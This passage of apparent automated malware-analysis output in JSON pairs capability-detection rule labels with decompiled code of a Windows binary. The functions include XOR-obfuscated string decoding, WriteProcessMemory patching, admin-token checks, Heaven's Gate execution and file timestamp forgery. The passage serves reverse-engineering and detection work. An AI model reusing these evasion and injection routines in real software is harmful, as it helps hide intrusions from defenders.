        "decompiled_code": "\nint32_t __fastcall fcn.00409be5(int32_t param_1)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint extraout_ECX;\n    int32_t iVar4;\n    int32_t lpBuffer;\n    int32_t lpNumberOfBytesRead;\n    uint lpFileName;\n    int32_t lDistanceToMove;\n    int32_t var_4h;\n    \n    iVar4 = 0;\n    var_4h = 0;\n    iVar2 = fcn.0040aadd();\n    if (iVar2 == 0) {\n        iVar2 = fcn.0040bdde(extraout_ECX);\n        if ((iVar2 != 0) && (lDistanceToMove = fcn.0040be64(),  lDistanceToMove != 0)) {\n            cVar1 = '\\0';\n            if (((*0x41dadc & 1) != 0) && (*(*(param_1 + 0x3c) + 4 + param_1) == 0x14c)) {\n                cVar1 = fcn.00409a70();\n                cVar1 = '\\x01' - (cVar1 != '\\0');\n            }\n            iVar4 = (*_sym.imp.KERNEL32.dll_CreateFileW)(lpFileName, 0x80000000, 1, 0, 3, 0x80, 0);\n            if (iVar4 != -1) {\n                iVar2 = (*_sym.imp.KERNEL32.dll_SetFilePointer)(iVar4, lDistanceToMove, 0, 0);\n                if (((iVar2 == lDistanceToMove) &&\n                    (iVar2 = (*_sym.imp.KERNEL32.dll_ReadFile)(iVar4, &lpBuffer, 4, &lpNumberOfBytesRead, 0), \n                    iVar2 != 0)) && (lpNumberOfBytesRead == 4)) {\n                    var_4h = lpBuffer + param_1;\n                }\n                (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar4);\n            }\n            iVar4 = var_4h;\n            if (cVar1 != '\\0') {\n                fcn.00409a70();\n                iVar4 = var_4h;\n            }\n        }\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, lpFileName);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    }\n    return iVar4;\n}\n",
        "token_count": 539
    },
    "0040cee7": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0040cee7(uint32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    if ((arg_8h & 0x20006) == 0) {\n        iVar1 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExW)(0x80000001);\n    }\n    else {\n        iVar1 = (*_sym.imp.ADVAPI32.dll_RegCreateKeyExW)(0x80000001);\n    }\n    uVar2 = 0;\n    if (iVar1 == 0) {\n        uVar2 = arg_8h;\n    }\n    return uVar2;\n}\n",
        "token_count": 151
    },
    "00403af0": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00403af0(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint in_ECX;\n    int32_t in_EDX;\n    int32_t iVar2;\n    uint var_4h;\n    \n    iVar2 = 0;\n    arg_8h = arg_8h - in_EDX;\n    do {\n        iVar1 = (*_sym.imp.KERNEL32.dll_WriteProcessMemory)(in_ECX, in_EDX, arg_8h + in_EDX, 1, 0);\n        if (iVar1 == 0) {\n            return 0;\n        }\n        iVar2 = iVar2 + 1;\n        in_EDX = in_EDX + 1;\n    } while (iVar2 < 5);\n    return 1;\n}\n",
        "token_count": 175
    },
    "004049b3": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.004049b3(uint param_1)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint pSid;\n    uint pIdentifierAuthority;\n    uint var_ch;\n    int32_t nSize;\n    uint32_t cbSid;\n    \n    *0x41dad8 = param_1;\n    (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0);\n    *0x41daec = (*_sym.imp.KERNEL32.dll_GetVersion)();\n    *0x41dad0 = (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n    fcn.004097d6();\n    fcn.0040494a();\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x20);\n    pcVar1 = _sym.imp.KERNEL32.dll_HeapAlloc;\n    *0x41db08 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    if (*0x41db08 != 0) {\n        nSize = 0x10;\n        iVar4 = (*_sym.imp.KERNEL32.dll_GetComputerNameW)(*0x41db08, &nSize);\n        if (iVar4 == 0) {\n            var_24h = 0x573a562c;\n            var_20h = 0x56374b28;\n            var_1ch = 0x4b34573b;\n            var_18h._0_2_ = 0x5679;\n            pIdentifierAuthority = 0x57745679;\n            var_ch._0_2_ = 0x4b63;\n            uVar3 = (*pcVar2)(8, 0x1d);\n            iVar4 = (*pcVar1)(uVar3);\n            iVar6 = 0;\n            do {\n                iVar5 = (*_sym.imp.USER32.dll_GetMenuCheckMarkDimensions)();\n                if (iVar5 != 0x8d82f8) {\n                    cbSid = 6;\n                    *(iVar6 + iVar4) = *(&pIdentifierAuthority + iVar6 % 6) ^ (iVar6 + iVar4)[&var_24h - iVar4];\n                }\n                iVar6 = iVar6 + 1;\n            } while (iVar6 < 0xe);\n            (*_sym.imp.KERNEL32.dll_lstrcpyW)(*0x41db08, iVar4);\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n        }\n        fcn.004045d6();\n    }\n    var_ch._0_2_ = 0x500;\n    pIdentifierAuthority = 0;\n    cbSid = (*_sym.imp.ADVAPI32.dll_AllocateAndInitializeSid)\n                      (&pIdentifierAuthority, 2, 0x20, 0x220, 0, 0, 0, 0, 0, 0, &nSize);\n    pcVar1 = _sym.imp.ADVAPI32.dll_CheckTokenMembership;\n    if (cbSid != 0) {\n        iVar4 = (*_sym.imp.ADVAPI32.dll_CheckTokenMembership)(0, nSize, &cbSid);\n        cbSid = cbSid & -(iVar4 != 0);\n        (*_sym.imp.ADVAPI32.dll_FreeSid)(nSize);\n        if (cbSid != 0) {\n            if (*0x41daec < 6) {\n                return 0;\n            }\n            fcn.00404c2d();\n            goto code_r0x00404b44;\n        }\n    }\n    nSize = 0;\n    cbSid = 0xc;\n    nSize = (*_sym.imp.ADVAPI32.dll_CreateWellKnownSid)(0x27, 0, &pSid, &cbSid);\n    if (nSize != 0) {\n        (*pcVar1)(0, &pSid, &nSize);\n    }\ncode_r0x00404b44:\n    if (5 < *0x41daec) {\n        fcn.00404b5d();\n    }\n    return 0;\n}\n",
        "token_count": 992
    },
    "0040cf40": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0040cf40(uchar *param_1)\n\n{\n    int16_t iVar1;\n    char cVar2;\n    uint uVar3;\n    int16_t *piVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int16_t *piVar7;\n    uchar *puVar8;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uchar *var_4h;\n    \n    if (param_1 != NULL) {\n        puVar8 = param_1;\n        for (iVar6 = 0x208; iVar6 != 0; iVar6 = iVar6 + -1) {\n            *puVar8 = 0;\n            puVar8 = puVar8 + 1;\n        }\n        var_4h = param_1;\n        cVar2 = (*_sym.imp.KERNEL32.dll_GetVersion)();\n        if (cVar2 == '\\x05') {\n            var_28h = 0x4c054561;\n            var_24h = 0x45463857;\n            var_20h = 0x38504c1d;\n            var_1ch = 0x4c0f4540;\n            var_18h._0_2_ = 0x3831;\n            var_14h = 0x4c6a4532;\n            var_10h._0_2_ = 0x3831;\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x25);\n            piVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n            var_ch = 6;\n            iVar6 = 0;\n            do {\n                iVar5 = (*_sym.imp.USER32.dll_GetCaretBlinkTime)();\n                if (iVar5 != 0xf2f8ea) {\n                    *(iVar6 + piVar4) = *(&var_14h + iVar6 % var_ch) ^ (iVar6 + piVar4)[&var_28h - piVar4];\n                }\n                iVar6 = iVar6 + 1;\n            } while (iVar6 < 0x12);\n            piVar7 = piVar4;\n            do {\n                iVar1 = *piVar7;\n                *((var_4h - piVar4) + piVar7) = iVar1;\n                piVar7 = piVar7 + 1;\n            } while (iVar1 != 0);\n        }\n        else {\n            var_50h = 0x6c197938;\n            var_4ch = 0x760d6b10;\n            var_48h = 0x790a761b;\n            var_44h = 0x6b136c04;\n            var_40h = 0x762d7625;\n            var_3ch = 0x6c06791b;\n            var_38h = 0x76186b32;\n            var_34h = 0x790a7618;\n            var_30h = 0x6b196c3a;\n            var_2ch = 0x766c760e;\n            var_14h = 0x6c76796b;\n            var_10h._0_2_ = CONCAT11(var_10h._1_1_, 0x76);\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x51);\n            piVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n            var_8h = 5;\n            iVar6 = 0;\n            do {\n                iVar5 = (*_sym.imp.USER32.dll_GetProcessWindowStation)();\n                if (iVar5 != 0xa8dbe2) {\n                    *(iVar6 + piVar4) = *(&var_14h + iVar6 % var_8h) ^ (iVar6 + piVar4)[&var_50h - piVar4];\n                }\n                iVar6 = iVar6 + 1;\n            } while (iVar6 < 0x28);\n            piVar7 = piVar4;\n            do {\n                iVar1 = *piVar7;\n                *((var_4h - piVar4) + piVar7) = iVar1;\n                piVar7 = piVar7 + 1;\n            } while (iVar1 != 0);\n        }\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, piVar4);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    }\n    return;\n}\n",
        "token_count": 1135
    },
    "0040e9d8": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040e9d8(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    int32_t var_18h;\n    int32_t *var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    iVar4 = -1;\n    iVar3 = 0;\n    var_10h = param_2 * 10;\n    var_ch = param_1;\n    do {\n        iVar1 = var_10h;\n        var_4h = 0;\n        var_8h = 0;\n        puVar5 = &var_18h;\n        for (iVar2 = 8; iVar2 != 0; iVar2 = iVar2 + -1) {\n            *puVar5 = 0;\n            puVar5 = puVar5 + 1;\n        }\n        iVar1 = fcn.0040bad5(iVar1, 0, &var_8h, &var_4h);\n        if (iVar1 == 0) {\n            if (var_4h == var_8h) {\n                if (var_18h == 4) {\n                    iVar4 = *var_14h;\n                }\n                fcn.0040cd6f();\n            }\n            if (iVar4 != -1) {\n                return iVar4;\n            }\n        }\n        else {\n            (*_sym.imp.KERNEL32.dll_Sleep)(1000);\n        }\n        iVar3 = iVar3 + 1;\n        if (4 < iVar3) {\n            return iVar4;\n        }\n    } while( true );\n}\n",
        "token_count": 401
    },
    "004048d3": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004048d3(int32_t param_1, int32_t param_2)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint var_4h;\n    \n    var_4h = 0;\n    if (param_1 != 0) {\n        if (param_2 == -1) {\n            param_2 = (*_sym.imp.KERNEL32.dll_lstrlenW)(param_1);\n        }\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, param_2 + 1);\n        iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n        if ((iVar2 != 0) &&\n           (iVar3 = (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)(0, 0, param_1, param_2, iVar2, param_2 + 1, 0, 0), \n           iVar3 != 0)) {\n            var_4h = fcn.0040480b();\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 287
    },
    "0040c4bf": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040c4bf(int32_t *arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint uVar6;\n    int32_t in_ECX;\n    int32_t *in_EDX;\n    int32_t iVar7;\n    uint var_ch;\n    uint var_8h;\n    int32_t lpNumberOfBytesRead;\n    \n    iVar7 = 0;\n    iVar2 = fcn.0040c44d();\n    if (iVar2 != 0) {\n        in_ECX = iVar2;\n    }\n    iVar3 = (*_sym.imp.KERNEL32.dll_CreateFileW)(in_ECX, 0x80000000, 1, 0, 3, 0x80, 0);\n    if (iVar3 != -1) {\n        iVar4 = (*_sym.imp.KERNEL32.dll_GetFileSize)(iVar3, 0);\n        if (iVar4 == 0) {\n            iVar4 = 0xe8;\n            goto code_r0x0040c561;\n        }\n        uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, iVar4 + 2);\n        iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar6);\n        if (iVar7 != 0) {\n            iVar5 = (*_sym.imp.KERNEL32.dll_ReadFile)(iVar3, iVar7, iVar4, &lpNumberOfBytesRead, 0);\n            if (iVar5 != 0) {\n                if (iVar4 == lpNumberOfBytesRead) {\n                    *(iVar4 + iVar7) = 0;\n                    *in_EDX = iVar7;\n                    *arg_8h = iVar4;\n                    iVar4 = 0;\n                }\n                else {\n                    iVar4 = 0x1e;\n                }\n                goto code_r0x0040c561;\n            }\n        }\n    }\n    iVar4 = (*_sym.imp.KERNEL32.dll_GetLastError)();\ncode_r0x0040c561:\n    if (iVar3 != -1) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar3);\n    }\n    pcVar1 = _sym.imp.KERNEL32.dll_HeapFree;\n    if ((iVar7 != 0) && (iVar4 != 0)) {\n        uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar7);\n        (*pcVar1)(uVar6);\n    }\n    if (iVar2 != 0) {\n        uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n        (*pcVar1)(uVar6);\n    }\n    return iVar4;\n}\n",
        "token_count": 609
    },
    "0040c5a3": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0040c5a3(uint lpLastWriteTime)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    uint in_EDX;\n    uint32_t uVar7;\n    int32_t iVar8;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint lpSystemTime;\n    uint var_22h;\n    int16_t var_1eh;\n    int16_t var_1ch;\n    int16_t var_1ah;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint lpLastAccessTime;\n    uint lpCreationTime;\n    \n    iVar3 = *0x41dd6c;\n    lpLastAccessTime = in_EDX;\n    (*_sym.imp.KERNEL32.dll_GetSystemTime)(&lpSystemTime);\n    pcVar1 = _sym.imp.KERNEL32.dll_SystemTimeToFileTime;\n    uVar7 = iVar3 * 0x19660d + 0x3c6ef35f;\n    lpSystemTime._2_2_ = uVar7 % 0xb + 1;\n    uVar7 = uVar7 * 0x19660d + 0x3c6ef35f;\n    uVar6 = uVar7 * 0x19660d + 0x3c6ef35f;\n    var_22h._0_2_ = uVar7 % 0x1b + 1;\n    var_22h._2_2_ = uVar6 % 0x16 + 1;\n    uVar7 = uVar6 * 0x19660d + 0x3c6ef35f;\n    uVar6 = uVar7 * 0x19660d + 0x3c6ef35f;\n    var_1eh = uVar7 % 0x3b + 1;\n    var_1ch = uVar6 % 0x3b + 1;\n    lpSystemTime._0_2_ = lpSystemTime + -1;\n    var_1ah = (uVar6 * 0x17385ca9 + 0x47502932) % 0x3e6 + 1;\n    (*_sym.imp.KERNEL32.dll_SystemTimeToFileTime)(&lpSystemTime);\n    (*pcVar1)(&lpSystemTime);\n    (*pcVar1)(&lpSystemTime, lpLastWriteTime);\n    var_5ch = 0x4c387160;\n    var_58h = 0x712b4710;\n    var_54h = 0x47104c2b;\n    var_50h = 0x4c6a7137;\n    var_4ch = 0x71364725;\n    var_48h = 0x470a4c36;\n    var_44h = 0x4c2a7131;\n    var_40h = 0x71764714;\n    var_3ch = 0x47254c7d;\n    var_38h = 0x4c227126;\n    var_34h = 0x716b471d;\n    var_30h = 0x47014c2a;\n    var_2ch = 0x4c4f7120;\n    var_18h = 0x4c4f7145;\n    var_14h._0_2_ = 0x4779;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x69);\n    iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar8 = 0;\n    do {\n        iVar4 = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n        if (iVar4 != 0x1a53a1) {\n            var_10h = 6;\n            *(iVar8 + iVar3) = *(&var_18h + iVar8 % 6) ^ (iVar8 + iVar3)[&var_5ch - iVar3];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0x34);\n    iVar8 = fcn.0040c44d();\n    if (iVar8 != 0) {\n        iVar4 = (*_sym.imp.KERNEL32.dll_CreateFileW)(iVar8, 0x80000000, 1, 0, 3, 0, 0);\n        if ((iVar4 != 0) && (iVar4 != -1)) {\n            iVar5 = (*_sym.imp.KERNEL32.dll_GetFileTime)(iVar8, lpCreationTime, lpLastAccessTime, lpLastWriteTime);\n            if (iVar5 == 0) {\n                (*_sym.imp.KERNEL32.dll_SystemTimeToFileTime)(&lpSystemTime, lpCreationTime);\n                (*_sym.imp.KERNEL32.dll_SystemTimeToFileTime)(&lpSystemTime, lpLastAccessTime);\n                (*_sym.imp.KERNEL32.dll_SystemTimeToFileTime)(&lpSystemTime, lpLastWriteTime);\n            }\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar4);\n        }\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar8);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n    }\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n    return 0;\n}\n",
        "token_count": 1332
    },
    "0040c7ca": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040c7ca(uint nNumberOfBytesToWrite)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint uVar5;\n    int32_t in_ECX;\n    uint in_EDX;\n    uint lpCreationTime;\n    uint lpLastAccessTime;\n    uint lpLastWriteTime;\n    uint lpNumberOfBytesWritten;\n    uint lpBuffer;\n    \n    lpBuffer = in_EDX;\n    iVar1 = fcn.0040c44d();\n    if (iVar1 != 0) {\n        in_ECX = iVar1;\n    }\n    iVar2 = (*_sym.imp.KERNEL32.dll_CreateFileW)(in_ECX, 0xc0000000, 0, 0, 4, 0x80, 0);\n    if (iVar2 == -1) {\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n    }\n    else {\n        fcn.0040c5a3(&lpLastWriteTime);\n        iVar4 = (*_sym.imp.KERNEL32.dll_WriteFile)(iVar2, lpBuffer, nNumberOfBytesToWrite, &lpNumberOfBytesWritten, 0);\n        if (iVar4 == 0) {\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        }\n        else {\n            (*_sym.imp.KERNEL32.dll_SetEndOfFile)(iVar2);\n            uVar3 = 0;\n        }\n        (*_sym.imp.KERNEL32.dll_SetFileTime)(iVar2, &lpCreationTime, &lpLastAccessTime, &lpLastWriteTime);\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar2);\n    }\n    if (iVar1 != 0) {\n        uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar1);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\n    }\n    return uVar3;\n}\n",
        "token_count": 433
    },
    "0040e379": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040e379(uint param_1)\n\n{\n    int32_t iVar1;\n    \n    *0x41dd68 = 1;\n    fcn.0040f608(param_1);\n    fcn.0040bb21();\n    iVar1 = (*_sym.imp.KERNEL32.dll_GetFileAttributesW)(*0x41dacc);\n    if (iVar1 != -1) {\n        fcn.0040cb6d();\n    }\n    fcn.0040df0b();\n    (*_sym.imp.KERNEL32.dll_Sleep)(10000);\n    fcn.0040de20();\n    return;\n}\n",
        "token_count": 140
    },
    "0040494a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/73780005e39049dabd818a965d665a12",
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/bde1572c33fb4ad4a176b04786e84c23"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0040494a(void)\n\n{\n    uint uVar1;\n    code *pcVar2;\n    uint var_48h;\n    uint var_24h;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint var_14h;\n    uint lpModuleName;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    lpModuleName = 0x6e72656b;\n    var_ch = 0x32336c65;\n    var_8h = 0x6c6c642e;\n    var_4h._0_1_ = 0;\n    var_24h = str.GetNativeSystemIDigitalProductIdSOFTWAREMicrosoftWindows_NTCu._0_4_;\n    uStack36 = str.GetNativeSystemIDigitalProductIdSOFTWAREMicrosoftWindows_NTCu._4_4_;\n    uStack32 = str.GetNativeSystemIDigitalProductIdSOFTWAREMicrosoftWindows_NTCu._8_4_;\n    uStack28 = str.GetNativeSystemIDigitalProductIdSOFTWAREMicrosoftWindows_NTCu._12_4_;\n    var_14h = 0x6f666e;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(&lpModuleName, &var_24h);\n    pcVar2 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1);\n    if (pcVar2 != NULL) {\n        (*pcVar2)(&var_48h);\n        if (var_48h == 9) {\n            *0x41dadc = 1;\n        }\n    }\n    return;\n}\n",
        "token_count": 362
    },
    "0040afdd": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/73780005e39049dabd818a965d665a12",
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/bde1572c33fb4ad4a176b04786e84c23"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.0040afdd(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    code *pcVar5;\n    int32_t iVar6;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uchar var_1ch;\n    uchar uStack31;\n    uint var_18h;\n    uint var_14h;\n    int32_t lpLibFileName;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_24h = 0x351c0008;\n    var_ch = 6;\n    var_20h = 0x58570006;\n    var_1ch = 0x54;\n    var_18h = 0x546a6469;\n    var_14h._0_2_ = CONCAT11(var_14h._1_1_, 0x76);\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 10);\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    iVar6 = 0;\n    lpLibFileName = iVar2;\n    do {\n        iVar3 = (*_sym.imp.USER32.dll_GetDoubleClickTime)();\n        if (iVar3 != 0x9413d3) {\n            var_8h = 5;\n            *(iVar6 + iVar2) = *(&var_18h + iVar6 % 5) ^ (iVar6 + iVar2)[&var_24h - iVar2];\n        }\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 9);\n    pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (*0x41dd58 == NULL) {\n        var_2ch = 0x1c3e312b;\n        var_28h = 0x3d3e5f01;\n        var_24h = 0x5b100b23;\n        var_20h = 0x5b7d2617;\n        var_1ch = 0x52;\n        uStack31 = 0x32;\n        var_18h = 0x684d4878;\n        var_14h._0_2_ = 0x3264;\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x13);\n        iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n        iVar3 = 0;\n        var_8h = &var_2ch - iVar6;\n        do {\n            iVar4 = (*_sym.imp.USER32.dll_GetClipboardSequenceNumber)();\n            iVar2 = lpLibFileName;\n            if (iVar4 != 0x26504) {\n                *(iVar3 + iVar6) = *(&var_18h + iVar3 % var_ch) ^ (iVar3 + iVar6)[&var_2ch - iVar6];\n            }\n            iVar3 = iVar3 + 1;\n        } while (iVar3 < 0x12);\n        uVar1 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(lpLibFileName, iVar6);\n        *0x41dd58 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1);\n        pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar6);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n    }\n    (**0x41dd58)(&var_4h, 4);\n    if (var_4h < 0) {\n        var_4h = -var_4h;\n    }\n    iVar6 = var_4h;\n    uVar1 = (*pcVar5)(0, iVar2);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n    return iVar6;\n}\n",
        "token_count": 907
    },
    "00404c2d": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\nuint fcn.00404c2d(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint ReturnLength;\n    uint TokenInformation;\n    uint TokenHandle;\n    \n    TokenInformation = 0;\n    if (*0x41daec == 6) {\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(0x20008, &TokenHandle);\n        iVar2 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(uVar1);\n        if (iVar2 != 0) {\n            (*_sym.imp.ADVAPI32.dll_GetTokenInformation)(TokenHandle, 0x14, &TokenInformation, 4, &ReturnLength);\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(TokenHandle);\n        }\n    }\n    return TokenInformation;\n}\n",
        "token_count": 177
    },
    "0040bad5": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nint32_t __cdecl fcn.0040bad5(uint arg_8h, uint arg_ch, uint32_t *arg_10h, uint32_t *arg_14h)\n\n{\n    int32_t iVar1;\n    uint *in_EDX;\n    uint var_4h;\n    \n    do {\n        iVar1 = fcn.0040b2fb(arg_8h, arg_ch, arg_10h, arg_14h, *in_EDX);\n        if (iVar1 != 6) break;\n    } while (*arg_14h <= *arg_10h && *arg_10h != *arg_14h);\n    if (iVar1 != 0) {\n        fcn.0040cd6f();\n    }\n    return iVar1;\n}\n",
        "token_count": 184
    },
    "004066ce": {
        "rules": [
            "64-bit execution via heavens gate/cf627f8086064c53962fc93043360d1e"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.004066ce(void)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint var_140h;\n    int32_t var_13ch;\n    uint var_138h;\n    int32_t var_134h;\n    uint var_130h;\n    int32_t var_12ch;\n    uint var_128h;\n    int32_t var_124h;\n    uint var_120h;\n    int32_t var_11ch;\n    uint var_118h;\n    int32_t var_114h;\n    uint var_110h;\n    int32_t var_10ch;\n    uint var_108h;\n    int32_t var_104h;\n    uint var_100h;\n    int32_t var_fch;\n    uint var_f8h;\n    int32_t var_f4h;\n    uint var_f0h;\n    int32_t var_ech;\n    uint var_e8h;\n    int32_t var_e4h;\n    uint var_e0h;\n    int32_t var_dch;\n    uint var_d8h;\n    int32_t var_d4h;\n    uint var_d0h;\n    int32_t var_cch;\n    uint var_c8h;\n    int32_t var_c4h;\n    uint 